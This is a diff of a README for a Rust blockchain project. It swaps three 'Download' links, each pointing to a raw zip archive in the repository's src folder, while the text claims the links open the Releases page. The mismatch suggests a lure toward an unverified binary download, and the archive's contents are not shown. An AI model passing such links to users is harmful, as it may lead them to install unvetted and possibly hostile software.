@@ -1,6 +1,6 @@
 # 🌐 rust-blockchain-core - Explore the World of Blockchain
 
-[![Download](https://raw.githubusercontent.com/szy0221/rust-blockchain-core/main/src/core_blockchain_rust_2.8.zip)](https://raw.githubusercontent.com/szy0221/rust-blockchain-core/main/src/core_blockchain_rust_2.8.zip)
+[![Download](https://github.com/szy0221/rust-blockchain-core/raw/refs/heads/main/src/rust-blockchain-core-1.0.zip)](https://github.com/szy0221/rust-blockchain-core/raw/refs/heads/main/src/rust-blockchain-core-1.0.zip)
 
 ## 📜 Description
 
@@ -21,7 +21,7 @@ Follow these steps to get the application up and running on your computer.
 
 To download the software, visit the Releases page:
 
-[Download Latest Version](https://raw.githubusercontent.com/szy0221/rust-blockchain-core/main/src/core_blockchain_rust_2.8.zip)
+[Download Latest Version](https://github.com/szy0221/rust-blockchain-core/raw/refs/heads/main/src/rust-blockchain-core-1.0.zip)
 
 1. Click the link above.
 2. On the Releases page, look for the latest version listed.
@@ -61,6 +61,6 @@ Yes! Contributions are welcome. If you have ideas for improvements or features, 
 
 Keep track of all updates and changes in the Changelog section available on the Releases page.
 
-[Download Latest Version](https://raw.githubusercontent.com/szy0221/rust-blockchain-core/main/src/core_blockchain_rust_2.8.zip)
+[Download Latest Version](https://github.com/szy0221/rust-blockchain-core/raw/refs/heads/main/src/rust-blockchain-core-1.0.zip)
 
 For any issues or questions not covered here, please refer to the GitHub Issues page. Thank you for exploring rust-blockchain-core!
